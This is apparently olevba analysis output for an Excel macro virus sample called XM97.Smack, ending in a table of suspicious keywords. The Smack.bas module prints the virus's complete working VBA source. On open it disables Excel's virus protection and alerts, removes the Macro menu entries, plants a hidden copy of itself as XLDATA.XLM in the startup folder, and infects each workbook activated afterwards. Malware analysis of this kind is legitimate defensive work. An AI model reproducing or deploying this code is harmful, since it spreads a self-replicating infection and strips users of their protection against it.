olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle4.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle5.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle6.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle7.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle8.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle9.cls 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Smack.bas 
in file: Virus.MSExcel.Smack-f985462190f7d913454fddda8c833979b9aa7999 - OLE stream: '_VBA_PROJECT_CUR/VBA/Smack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Hey people, I'm new here..
'Do you know my name?
'The name's XM97.Smack!!!
'Heh... now you're seeing my code eh..
'OK, you got me...
'Come on, kill me!!!
'Ummm, on second thought...
'Please don't kill me, Pretty PLEASE..
'PLEASE DON'T KILL ME
'I want to live forever...
'Forever Young!
'Heheh

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  Application.ScreenUpdating = False
  Application.DisplayStatusBar = False
  Application.DisplayAlerts = False
  Options.ConfirmConversions = False
  Options.SaveNormalPrompt = False
  Options.VirusProtection = False
  MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
  MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
  MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
  MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
  MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
  If Not IsGlobalInfected() Then
    Aaaaahhhh
  End If
  Application.OnSheetActivate = "XLDATA.XLM!Smack1"
  If (Day(Now) = "10") And (Month(Now) = "9") Then
    MsgBox "You know what?" & Chr$(13) & "You're getting OLD, man!!!", , "Smack!!!"
  End If
End Sub
Function IsGlobalInfected() As Boolean
Attribute IsGlobalInfected.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error GoTo Smack_3
  IsGlobalInfected = False
  For A = 1 To Application.Workbooks.Count
    If Application.Workbooks(A).Name = "XLDATA.XLM" Then
      For b = 1 To Application.Workbooks("XLDATA.XLM").Modules.Count
        If Application.Workbooks("XLDATA.XLM").Modules(b).Name = "Smack" Then
          IsGlobalInfected = True
        End If
      Next b
    End If
  Next A
Smack_3:
End Function
Function Aaaaahhhh()
Attribute Aaaaahhhh.VB_ProcData.VB_Invoke_Func = " \n14"
  ab = ActiveWorkbook.Name
  Workbooks(ab).SaveCopyAs Application.StartupPath + "\XLDATA.XLM"
  Workbooks.Open (Application.StartupPath + "\XLDATA.XLM")
  Windows("XLDATA.XLM").Visible = False
  Application.Workbooks("XLDATA.XLM").Save
End Function
Function DocIsInfected() As Boolean
Attribute DocIsInfected.VB_ProcData.VB_Invoke_Func = " \n14"
  abc = ActiveWorkbook.Name
  DocIsInfected = False
  For y = 1 To Application.Workbooks(abc).Modules.Count
    If Application.Workbooks(abc).Modules(y).Name = "Smack" Then
      DocIsInfected = True
    End If
  Next y
End Function
Sub Smack1()
Attribute Smack1.VB_ProcData.VB_Invoke_Func = " \n14"
  abcd = ActiveWorkbook.Name
  If Not DocIsInfected() Then
    Application.ScreenUpdating = False
    Application.Windows("XLDATA.XLM").Visible = True
    Workbooks("XLDATA.XLM").Activate
    Sheets("smack").Visible = True
    Workbooks("XLDATA.XLM").Sheets("Smack").Copy Before:=Workbooks(abcd).Sheets(1)
    Workbooks(abcd).Sheets("Smack").Visible = False
    Workbooks("XLDATA.XLM").Sheets("Smack").Visible = False
    Application.Windows("XLDATA.XLM").Visible = False
  End If
  Close
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

